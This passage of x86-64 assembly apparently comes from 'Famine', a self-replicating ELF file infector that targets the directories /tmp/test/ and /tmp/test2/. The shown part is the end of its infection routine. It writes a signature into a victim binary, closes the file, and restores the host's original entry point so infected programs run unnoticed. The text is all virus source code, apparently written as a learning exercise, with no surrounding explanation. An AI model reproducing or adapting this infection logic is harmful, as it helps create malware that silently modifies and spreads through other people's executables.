	syscall

	mov		rax, SYS_WRITE
	mov		edi, DWORD [rsp]
	lea		rsi, [rel famine64_signature]
	mov		rdx, 8
	syscall

	mov		rax, SYS_CLOSE
	mov		edi, DWORD [rsp]
	syscall

infect_file_end_add:	
	add		rsp, 188
infect_file_end_pop:
	pop		rbx
	pop		rbp
	pop		r12
	pop		r13
	pop		r14
	pop		r15
infect_file_end:
	ret
	
famine64_end:
	cmp		QWORD [rel jump_offset], 0x0	; No jump offset if the executable is the original binary
	je		no_jump
	lea		rax, [rel famine64_func]
	add		QWORD [rel jump_offset], rax
no_jump:
	add		rsp, 0x10
	pop		rdi
	pop		rax

	cmp		QWORD [rel jump_offset], 0x0	; No jump address if the executable is the first
	je		do_ret
	push	QWORD [rel jump_offset]
do_ret:
	ret

data:
	zero db 0x0
	famine64_size dd end_of_file - famine64_func
	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx", 0
	dir_one db "/tmp/test/", 0
	dir_two db "/tmp/test2/", 0
	dir_all dq dir_one, dir_two, 0
	jump_offset dq 0x00000000
end_of_file:
